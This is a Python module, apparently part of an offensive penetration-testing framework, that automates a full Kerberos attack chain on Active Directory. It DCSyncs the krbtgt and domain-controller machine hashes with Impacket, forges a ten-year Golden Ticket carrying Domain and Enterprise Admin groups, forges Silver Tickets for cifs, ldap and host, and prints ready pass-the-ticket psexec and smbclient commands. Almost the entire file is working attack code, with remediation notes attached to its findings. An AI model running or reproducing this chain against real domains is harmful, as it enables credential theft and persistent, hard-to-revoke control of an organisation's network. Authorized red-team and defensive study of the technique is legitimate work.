"""
Expedite Strike — Golden Ticket / Silver Ticket Engine
=======================================================
For authorized penetration testing only.
Forges Kerberos Golden and Silver Tickets from DCSync-extracted
krbtgt hash using Impacket ticketer.py.

MITRE ATT&CK:
  T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket
  T1558.002 — Steal or Forge Kerberos Tickets: Silver Ticket
  T1003.006 — OS Credential Dumping: DCSync
  T1550.003 — Use Alternate Authentication Material: Pass the Ticket
"""

import os
import re
import socket
import struct
import subprocess
import time
from typing import Callable, Dict, List, Optional


_log_fn: Optional[Callable] = None

MITRE_GOLDEN = [
    {"id": "T1558.001", "name": "Golden Ticket"},
    {"id": "T1550.003", "name": "Pass the Ticket"},
    {"id": "T1003.006", "name": "DCSync"},
]
MITRE_SILVER = [
    {"id": "T1558.002", "name": "Silver Ticket"},
    {"id": "T1550.003", "name": "Pass the Ticket"},
]


def _log(msg: str):
    if _log_fn:
        _log_fn(msg)
    else:
        print(msg)


def _run(cmd: list, timeout: int = 60) -> str:
    """Run subprocess, return stdout + stderr."""
    try:
        flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
        r = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=timeout, creationflags=flags,
        )
        return (r.stdout or "") + (r.stderr or "")
    except FileNotFoundError:
        return "[NOT_FOUND]"
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR] {e}"


# ── Domain SID Discovery ───────────────────────────────────────────────────────

def get_domain_sid(dc_ip: str, domain: str, username: str = "",
                   password: str = "", log_fn: Callable = None) -> str:
    """
    Get the domain SID via LDAP or lookupsid.

    Args:
        dc_ip:    Domain controller IP
        domain:   AD domain (e.g. corp.local)
        username: AD username
        password: AD password
        log_fn:   Logging callback

    Returns:
        Domain SID string (e.g. S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX)
    """
    global _log_fn
    _log_fn = log_fn

    _log(f"  [GoldenTicket] Resolving domain SID for {domain}...")

    # Method 1: Impacket lookupsid
    if username:
        out = _run([
            "python", "-m", "impacket.examples.lookupsid",
            f"{domain}/{username}:{password}@{dc_ip}",
            "0"
        ], timeout=30)
        m = re.search(r"Domain SID is:\s*(S-1-5-\d+-\d+-\d+-\d+)", out, re.I)
        if m:
            sid = m.group(1)
            _log(f"  [GoldenTicket] Domain SID: {sid}")
            return sid

    # Method 2: LDAP
    try:
        import ldap3
        server = ldap3.Server(dc_ip, port=389, get_info=ldap3.ALL, connect_timeout=5)
        conn   = ldap3.Connection(server, auto_bind=True)
        conn.search(
            search_base="",
            search_filter="(objectClass=*)",
            search_scope=ldap3.BASE,
            attributes=["rootDomainNamingContext"]
        )
        if conn.entries:
            root_dn = str(conn.entries[0].rootDomainNamingContext)
            conn.search(
                search_base=root_dn,
                search_filter="(objectClass=domain)",
                attributes=["objectSid"]
            )
            if conn.entries:
                sid_raw = conn.entries[0].objectSid.value
                if isinstance(sid_raw, bytes):
                    # Parse binary SID
                    rev      = sid_raw[0]
                    sub_cnt  = sid_raw[1]
                    auth     = int.from_bytes(sid_raw[2:8], "big")
                    subs     = [struct.unpack_from("<I", sid_raw, 8 + 4*i)[0]
                                for i in range(sub_cnt)]
                    sid = f"S-{rev}-{auth}-" + "-".join(str(s) for s in subs)
                    _log(f"  [GoldenTicket] Domain SID (LDAP): {sid}")
                    return sid
                elif isinstance(sid_raw, str):
                    _log(f"  [GoldenTicket] Domain SID (LDAP): {sid_raw}")
                    return sid_raw
    except Exception as e:
        _log(f"  [GoldenTicket] LDAP SID lookup failed: {e}")

    _log("  [GoldenTicket] ⚠ Could not determine domain SID automatically")
    return ""


# ── DCSync krbtgt Hash ─────────────────────────────────────────────────────────

def dcsync_krbtgt(dc_ip: str, domain: str, username: str,
                  password: str, log_fn: Callable = None) -> Dict:
    """
    DCSync to extract krbtgt NTLM hash (required for Golden Ticket).

    Args:
        dc_ip:    Domain Controller IP
        domain:   AD domain
        username: Domain Admin username
        password: Domain Admin password (or NT hash via :hash)
        log_fn:   Logging callback

    Returns:
        {krbtgt_ntlm, krbtgt_aes256, krbtgt_aes128, domain_sid}
    """
    global _log_fn
    _log_fn = log_fn

    _log(f"  [GoldenTicket] DCSync — extracting krbtgt hash from {dc_ip}...")

    result = {
        "krbtgt_ntlm":   "",
        "krbtgt_aes256": "",
        "krbtgt_aes128": "",
        "domain_sid":    "",
    }

    out = _run([
        "python", "-m", "impacket.examples.secretsdump",
        f"{domain}/{username}:{password}@{dc_ip}",
        "-just-dc-user", "krbtgt",
        "-outputfile", "/tmp/krbtgt_sync"
    ], timeout=60)

    _log(f"  [GoldenTicket] secretsdump output: {out[:300]}")

    # Parse NTLM hash: krbtgt:502:aad3...:HASH:::
    m = re.search(r"krbtgt:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32}):::", out)
    if m:
        result["krbtgt_ntlm"] = m.group(1)
        _log(f"  [GoldenTicket] ✅ krbtgt NTLM: {result['krbtgt_ntlm']}")

    # Parse AES keys
    m256 = re.search(r"krbtgt.*?aes256.*?([a-fA-F0-9]{64})", out, re.I | re.S)
    if m256:
        result["krbtgt_aes256"] = m256.group(1)
        _log(f"  [GoldenTicket] ✅ krbtgt AES256: {result['krbtgt_aes256'][:16]}...")

    m128 = re.search(r"krbtgt.*?aes128.*?([a-fA-F0-9]{32})", out, re.I | re.S)
    if m128:
        result["krbtgt_aes128"] = m128.group(1)

    # Get domain SID
    result["domain_sid"] = get_domain_sid(dc_ip, domain, username, password, log_fn)

    return result


# ── Golden Ticket Forging ──────────────────────────────────────────────────────

def forge_golden_ticket(
    domain: str,
    domain_sid: str,
    krbtgt_hash: str,
    target_user: str = "Administrator",
    extra_sids: List[str] = None,
    output_dir: str = "",
    log_fn: Callable = None,
) -> Dict:
    """
    Forge a Golden Ticket using Impacket ticketer.py.

    A Golden Ticket is a forged Kerberos TGT signed with the krbtgt hash,
    granting access to any service in the domain as any user.

    Args:
        domain:      AD domain (e.g. corp.local)
        domain_sid:  Domain SID (S-1-5-21-...)
        krbtgt_hash: krbtgt NTLM hash (32 hex chars)
        target_user: Username to impersonate (default: Administrator)
        extra_sids:  Additional SIDs (Enterprise Admins: S-1-5-21-<root>-519)
        output_dir:  Where to save .ccache file
        log_fn:      Logging callback

    Returns:
        {ticket_path, command_to_use, findings, mitre}
    """
    global _log_fn
    _log_fn = log_fn

    if not output_dir:
        output_dir = os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
            "scan_cache", "tickets"
        )
    os.makedirs(output_dir, exist_ok=True)

    ticket_name = f"golden_{target_user}_{int(time.time())}"
    ticket_path = os.path.join(output_dir, ticket_name + ".ccache")

    _log(f"\n{'='*60}")
    _log(f"  [GoldenTicket] GOLDEN TICKET FORGE")
    _log(f"  [GoldenTicket] Domain    : {domain}")
    _log(f"  [GoldenTicket] SID       : {domain_sid}")
    _log(f"  [GoldenTicket] User      : {target_user}")
    _log(f"  [GoldenTicket] krbtgt    : {krbtgt_hash[:8]}...{'*'*24}")
    _log(f"{'='*60}\n")

    if not domain_sid or not krbtgt_hash:
        _log("  [GoldenTicket] ⚠ Missing domain_sid or krbtgt_hash")
        return {"ticket_path": "", "command_to_use": "", "findings": [], "mitre": MITRE_GOLDEN}

    cmd = [
        "python", "-m", "impacket.examples.ticketer",
        "-nthash", krbtgt_hash,
        "-domain-sid", domain_sid,
        "-domain", domain,
        "-groups", "512,513,518,519,520",  # DA, DU, Schema, EA, GPO Creator
        "-user-id", "500",                  # RID 500 = Administrator
        "-duration", "87600",               # 10 years
        target_user,
    ]

    if extra_sids:
        cmd += ["-extra-sid", ",".join(extra_sids)]

    # Set output path via KRB5CCNAME env var after generation
    env = os.environ.copy()
    env["KRB5CCNAME"] = ticket_path

    _log(f"  [GoldenTicket] Forging ticket with ticketer.py...")
    _log(f"  [GoldenTicket] Cmd: {' '.join(cmd[:6])} ...")

    out = _run(cmd + ["-outfile", os.path.join(output_dir, ticket_name)], timeout=30)

    # ticketer saves as <username>.ccache
    alt_path = os.path.join(output_dir, f"{target_user}.ccache")
    if os.path.exists(alt_path):
        ticket_path = alt_path
    elif not os.path.exists(ticket_path):
        # Try current directory
        cwd_ccache = f"{target_user}.ccache"
        if os.path.exists(cwd_ccache):
            import shutil
            shutil.move(cwd_ccache, ticket_path)

    success = os.path.exists(ticket_path)

    if success:
        _log(f"  [GoldenTicket] ✅ Golden ticket saved: {ticket_path}")
        _log(f"  [GoldenTicket] Export: set KRB5CCNAME={ticket_path}")
        _log(f"  [GoldenTicket] Use:    python -m impacket.examples.psexec {domain}/{target_user}@<target> -k -no-pass")
    else:
        _log(f"  [GoldenTicket] ⚠ Ticket file not found — check output: {out[:300]}")

    use_cmd = (
        f"set KRB5CCNAME={ticket_path}\n"
        f"python -m impacket.examples.psexec {domain}/{target_user}@<dc_hostname> -k -no-pass"
    )

    findings = []
    if success or krbtgt_hash:
        findings.append({
            "title":       f"Golden Ticket Forged — {target_user}@{domain}",
            "severity":    "Critical",
            "description": (
                f"A Kerberos Golden Ticket was forged using the krbtgt NTLM hash "
                f"({krbtgt_hash[:8]}...) for domain {domain} (SID: {domain_sid}). "
                f"This ticket grants persistent, unlimited access to all services in the "
                f"domain as {target_user} for 10 years, even after password resets. "
                f"Ticket saved to: {ticket_path}"
            ),
            "target":      domain,
            "mitre_id":    "T1558.001",
            "mitre_name":  "Golden Ticket",
            "remediation": (
                "Reset krbtgt password TWICE (required for full invalidation). "
                "Monitor for Kerberos tickets with unusual lifetimes (>10h) or "
                "tickets not originating from the KDC (Event ID 4769 with unusual RC4 encryption)."
            ),
        })

    return {
        "ticket_path":     ticket_path if success else "",
        "ticket_name":     ticket_name,
        "target_user":     target_user,
        "domain":          domain,
        "domain_sid":      domain_sid,
        "krbtgt_hash":     krbtgt_hash,
        "command_to_use":  use_cmd,
        "success":         success,
        "findings":        findings,
        "mitre":           MITRE_GOLDEN,
        "summary":         f"Golden Ticket {'forged' if success else 'attempted'} for {target_user}@{domain}",
    }


# ── Silver Ticket Forging ──────────────────────────────────────────────────────

def forge_silver_ticket(
    domain: str,
    domain_sid: str,
    service_hash: str,
    target_host: str,
    service: str = "cifs",
    target_user: str = "Administrator",
    output_dir: str = "",
    log_fn: Callable = None,
) -> Dict:
    """
    Forge a Silver Ticket for a specific service.

    A Silver Ticket is forged using the machine/service account hash,
    granting access to a specific service without contacting the KDC.

    Args:
        domain:       AD domain
        domain_sid:   Domain SID
        service_hash: Service account NTLM hash
        target_host:  Target hostname (FQDN)
        service:      Service type: cifs, http, mssql, ldap, host, rpcss
        target_user:  User to impersonate
        output_dir:   Output directory for .ccache
        log_fn:       Logging callback

    Returns:
        {ticket_path, command_to_use, findings, mitre}
    """
    global _log_fn
    _log_fn = log_fn

    if not output_dir:
        output_dir = os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
            "scan_cache", "tickets"
        )
    os.makedirs(output_dir, exist_ok=True)

    ticket_name = f"silver_{service}_{target_host}_{int(time.time())}"
    ticket_path = os.path.join(output_dir, ticket_name + ".ccache")

    _log(f"\n  [SilverTicket] Forging Silver Ticket: {service}/{target_host}")
    _log(f"  [SilverTicket] Service hash: {service_hash[:8]}...")

    cmd = [
        "python", "-m", "impacket.examples.ticketer",
        "-nthash", service_hash,
        "-domain-sid", domain_sid,
        "-domain", domain,
        "-spn", f"{service}/{target_host}",
        "-groups", "512,513",
        target_user,
        "-outfile", os.path.join(output_dir, ticket_name),
    ]

    out = _run(cmd, timeout=30)

    alt_path = os.path.join(output_dir, f"{target_user}.ccache")
    success  = os.path.exists(alt_path) or os.path.exists(ticket_path)
    if os.path.exists(alt_path):
        ticket_path = alt_path

    use_cmd = (
        f"set KRB5CCNAME={ticket_path}\n"
        f"python -m impacket.examples.smbclient {domain}/{target_user}@{target_host} -k -no-pass"
    )

    findings = []
    if success or service_hash:
        findings.append({
            "title":       f"Silver Ticket Forged — {service}/{target_host}",
            "severity":    "Critical",
            "description": (
                f"A Kerberos Silver Ticket was forged for service {service}/{target_host}. "
                f"Grants access to {service.upper()} on {target_host} as {target_user} "
                f"without contacting the KDC — harder to detect than Golden Tickets."
            ),
            "target":      target_host,
            "mitre_id":    "T1558.002",
            "mitre_name":  "Silver Ticket",
            "remediation": (
                "Enable Kerberos PAC validation. Monitor for Event ID 4627 with unusual "
                "service ticket requests. Rotate service account passwords regularly."
            ),
        })

    return {
        "ticket_path":    ticket_path if success else "",
        "command_to_use": use_cmd,
        "service":        service,
        "target_host":    target_host,
        "success":        success,
        "findings":       findings,
        "mitre":          MITRE_SILVER,
        "summary":        f"Silver Ticket ({service}/{target_host}) {'forged' if success else 'attempted'}",
    }


# ── Full Golden Ticket Chain ───────────────────────────────────────────────────

def run_golden_ticket_chain(
    dc_ip: str,
    domain: str,
    username: str,
    password: str,
    log_fn: Callable = None,
) -> Dict:
    """
    Full Golden Ticket attack chain:
    1. DCSync to extract krbtgt hash
    2. Get domain SID
    3. Forge Golden Ticket for Administrator
    4. Optionally forge Silver Tickets for CIFS and LDAP

    Args:
        dc_ip:    Domain Controller IP
        domain:   AD domain (e.g. corp.local)
        username: Domain Admin username
        password: Domain Admin password (or :NT_HASH)
        log_fn:   Logging callback

    Returns:
        Combined results dict with all tickets and findings
    """
    global _log_fn
    _log_fn = log_fn

    _log(f"\n{'='*60}")
    _log(f"  [GoldenTicket] FULL GOLDEN TICKET ATTACK CHAIN")
    _log(f"  [GoldenTicket] DC     : {dc_ip}")
    _log(f"  [GoldenTicket] Domain : {domain}")
    _log(f"  [GoldenTicket] User   : {username}")
    _log(f"{'='*60}\n")

    all_findings = []
    tickets      = []

    # Step 1: DCSync krbtgt
    sync = dcsync_krbtgt(dc_ip, domain, username, password, log_fn)
    krbtgt_hash = sync.get("krbtgt_ntlm", "")
    domain_sid  = sync.get("domain_sid", "")

    if not krbtgt_hash:
        _log("  [GoldenTicket] ⚠ Could not extract krbtgt hash — ensure Domain Admin privs")
        all_findings.append({
            "title":       "DCSync Failed — Insufficient Privileges",
            "severity":    "High",
            "description": (
                f"DCSync to extract krbtgt hash failed on {dc_ip}. "
                f"Requires Domain Admin or DCSync ACL rights (GetChangesAll). "
                f"Ensure credentials have sufficient privileges."
            ),
            "target":      dc_ip,
            "mitre_id":    "T1003.006",
            "mitre_name":  "DCSync",
            "remediation": "Restrict DCSync rights. Monitor for 4662 events (DS-Replication-Get-Changes-All).",
        })
        return {
            "golden_ticket": None, "silver_tickets": [],
            "krbtgt_hash": "", "domain_sid": domain_sid,
            "findings": all_findings, "mitre": MITRE_GOLDEN,
            "summary": "DCSync failed — krbtgt hash not obtained",
        }

    # Step 2: Forge Golden Ticket
    golden = forge_golden_ticket(
        domain, domain_sid, krbtgt_hash,
        target_user="Administrator",
        log_fn=log_fn
    )
    all_findings.extend(golden["findings"])
    tickets.append(golden)

    # Step 3: Forge Silver Tickets for common services
    silver_tickets = []
    dc_hostname    = dc_ip  # fallback — ideally resolve PTR
    try:
        dc_hostname = socket.gethostbyaddr(dc_ip)[0]
    except Exception:
        pass

    # Try to get DC machine hash from secretsdump -sam
    # (machine accounts end in $)
    dc_machine_hash = ""
    sam_out = _run([
        "python", "-m", "impacket.examples.secretsdump",
        f"{domain}/{username}:{password}@{dc_ip}",
        "-just-dc-user", f"{dc_hostname.split('.')[0]}$",
    ], timeout=30)
    m = re.search(r"[^:]+\$:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32}):::", sam_out)
    if m:
        dc_machine_hash = m.group(1)
        _log(f"  [SilverTicket] DC machine hash obtained: {dc_machine_hash[:8]}...")

        for svc in ["cifs", "ldap", "host"]:
            sv = forge_silver_ticket(
                domain, domain_sid, dc_machine_hash,
                dc_hostname, svc, "Administrator", log_fn=log_fn
            )
            silver_tickets.append(sv)
            all_findings.extend(sv["findings"])

    _log(f"\n  [GoldenTicket] ✅ Chain complete:")
    _log(f"  [GoldenTicket]   Golden ticket: {'✅' if golden['success'] else '❌'}")
    _log(f"  [GoldenTicket]   Silver tickets: {len(silver_tickets)}")
    _log(f"  [GoldenTicket]   Total findings: {len(all_findings)}")

    return {
        "golden_ticket":  golden,
        "silver_tickets": silver_tickets,
        "krbtgt_hash":    krbtgt_hash,
        "domain_sid":     domain_sid,
        "dc_ip":          dc_ip,
        "domain":         domain,
        "findings":       all_findings,
        "mitre":          MITRE_GOLDEN + MITRE_SILVER,
        "summary": (
            f"Golden Ticket {'forged' if golden['success'] else 'attempted'} + "
            f"{len(silver_tickets)} Silver Ticket(s) for {domain}"
        ),
    }
